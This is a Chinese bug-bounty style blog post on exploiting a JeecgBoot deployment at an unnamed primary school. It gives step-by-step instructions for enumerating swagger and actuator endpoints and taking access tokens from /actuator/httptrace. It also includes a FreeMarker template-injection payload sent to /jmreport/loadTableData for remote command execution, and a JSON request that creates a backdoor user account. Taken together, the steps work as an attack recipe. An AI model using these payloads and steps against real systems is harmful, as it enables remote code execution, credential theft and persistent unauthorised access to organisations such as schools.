---
title: 【SRC】jeecg框架-导致敏感信息泄露
categories:
  - SRC
date: 2025-10-16
image: images/101.webp
---
# 案例：xxx实验小学
（**特定目录访问swagger**）
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251017132256.png)
## 目录一
**1：输入手机号和密码（随意输），然后抓包**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251017132314.png)
**2：复制host界面，访问web信息**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251017132332.png)
**3：然后拼接jeecg的目录接口，/jeecg-boot/v2/api-docs?group=后台接口**
**Jeecg-boot/druid/login.html**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251017132404.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251017132436.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251017132446.png)
## 目录二：
**1：在jeecg-boot后面接上actuator,获得后续的大量接口**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251017132531.png)
**2：将第一个案例中的/jeecg-boot/v2/api-docs粘贴bp中，发包，选择一个特定接口**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251017132554.png)
```
/jeecg-boot/sys/formFile/add
```
**3:将get请求方式改为post请求方式，然后把content-type的格式改为json**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251017132616.png)
**4:使用jeecg-boot/actuator/httptrace获得access-token**
**(会保留一些用户登录的token信息）**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251017132741.png)
**5:将token输入swagger的接口中成功访问,比如打jeecg的rce接口：**
将下面的请求参数也一并复制的数据包里面（post）
```
{"dbsource":"","sql":"select '<#assign value=\"freemarker.template.utility.Execute\"?

new()>${value(\"echo 123k1msns\")}'","tableName":"test_demo);""pageNo":1,"pagesize":10}
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251017132827.png)
Jeecg-boot/jmreport/loadTableData
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251017132850.png)
放到最后
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251017132943.png)
**6：输入指令比如whoami**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251017133005.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251017133028.png)
**7:又或者下面的接口/jeecg-boot/sys/role/list，也只有获得了Access-Token才可以成功访问**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251017133055.png)
**8:访问后获得普通教师的id,使用添加用户的接口添加user用户**
**接口： /server/sys/user/add**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251017133130.png)
```
{
 "selectedroles":"1680133311360319489",
 "createBy":"admin",
 "userIdentity":"1",
 "username":"test12345",
 "password":"test12345",
 "confirmpassword":"test12345",
 "realname":"test12345"
}
```
**9:修改用户名和密码，发包，添加成功**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251017133208.png)
**10：在登录界面输入用户名和密码，登录成功**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251017133223.png)